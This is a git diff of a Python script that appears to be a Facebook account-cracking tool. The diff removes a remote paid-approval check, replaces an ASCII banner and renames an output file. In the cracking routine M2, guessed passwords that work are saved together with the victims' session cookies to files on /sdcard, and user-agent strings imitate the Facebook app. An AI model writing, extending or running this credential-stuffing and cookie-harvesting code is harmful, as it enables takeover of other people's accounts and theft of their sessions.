@@ -217,37 +217,20 @@ def iAmMethod2Ua():
     return ua        
     ua = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36 [FB_IAB/FB4A;FBAV/298.0.0.46.116;]","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36 OPR/38.0.2220.41 [FB_IAB/FB4A;FBAV/298.0.0.46.116;]","Mozilla/5.0 (Linux; Android 12; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/298.0.0.46.116;] '+END
     return ua
-	#-----------------------[ APPROVAL-DEF ]-----------------------#
-def aproval():
-    fresh()
-    uuid = str(os.geteuid())
-    id = "".join(uuid)
-    try:
-        url_apv = requests.get('https://github.com/HANDSOMEXSAMIR/approval.txt/blob/main/Paid.txt').text
-        if id in url_apv:
-            print(f" \x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m] \x1b[38;5;46mAPPROVED SUCCESSFUL");time.sleep(3)
-            Main()
-            pass
-        else:
-            print(f' \x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m] \x1b[38;5;46mYOUR KEY : AHMEDFARHAN{id}JOBAIDXJARIFXARIYAN')
-            line()
-            print(f' \x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m] \x1b[38;5;46mFREE TOOLS BUT YOU NEED APPROVAL TO USE THIS TOOLS')
-            line()
-            print(f' \x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m] \x1b[38;5;46mMY FACEBOOK LINK CONTACK WITH ME FOR APPROVAL')
-            print(f' \x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m] \x1b[38;5;46mLINK : https://www.facebook.com/F4RH9NXXX.COM12')
-    except:pass
-#-----------------------[ END-CODE ]-----------------------#
 logo=("""
 \033[1;37m   
-  ___ ___    _____    _______  ________    _________________      _____  ___________ 
- /   |   \  /  _  \   \      \ \______ \  /   _____/\_____  \    /     \ \_   _____/ 
-/    ~    \/  /_\  \  /   |   \ |    |  \ \_____  \  /   |   \  /  \ /  \ |    __)_  
-\    Y    /    |    \/    |    \|    `   \/        \/    |    \/    Y    \|        \ 
- \___|_  /\____|__  /\____|__  /_______  /_______  /\_______  /\____|__  /_______  / 
-       \/         \/         \/        \/        \/         \/         \/        \/  
+  
+db   db  .d8b.  d8b   db d8888b. .d8888.  .d88b.  .88b  d88. d88888b      
+88   88 d8' `8b 888o  88 88  `8D 88'  YP .8P  Y8. 88'YbdP`88 88'          
+88ooo88 88ooo88 88V8o 88 88   88 `8bo.   88    88 88  88  88 88ooooo      
+88~~~88 88~~~88 88 V8o88 88   88   `Y8b. 88    88 88  88  88 88~~~~~      
+88   88 88   88 88  V888 88  .8D db   8D `8b  d8' 88  88  88 88.          
+YP   YP YP   YP VP   V8P Y8888D' `8888Y'  `Y88P'  YP  YP  YP Y88888P      
+                                                                          
+                                                                          
  ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━┓
  ┃DEVELOPER:HANDSOME         ┃𝐒𝐓𝐀𝐓𝐔𝐒: PREMIUM    ┃
- ┃𝐅𝐁 𝐈𝐃:DI W AS              ┃𝐕𝐄𝐑𝐒𝐈𝐎𝐍:2.0        ┃
+ ┃𝐅𝐁 𝐈𝐃:DI W AS              ┃𝐕𝐄𝐑𝐒𝐈𝐎𝐍:2.1        ┃
  ┣━━━━━━━━━━━━━━━━━━━━━━━━━┳━┻━━━━━━━━━━━━━━━━━━━┫
  ┃𝐆𝐈𝐓𝐇𝐔𝐁:VANDAINA          ┃ 𝐓𝐎𝐎𝐋 : FILE         |
  ┗━━━━━━━━━━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━┛
@@ -773,7 +756,7 @@ def M2(ids,names,passlist):
                                         ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"                                	
                                         print('\r\r\033[1;32m [HANDSOME-OK] '+ids+' | '+pas+'\033[1;97m')
                                     #    print("\033[1;32m [COOOKIS] :\033[1;34m "+cookie)
-                                        open('/sdcard/HANDSOME_M2_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/ALONE_iDs_COOKiE_M2.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
+                                        open('/sdcard/HANDSOME_M2_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/HANDSOME_iDs_COOKiE_M2.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                                         Elite(ids,pas,cookie)
                                         oks.append(ids)
                                         break
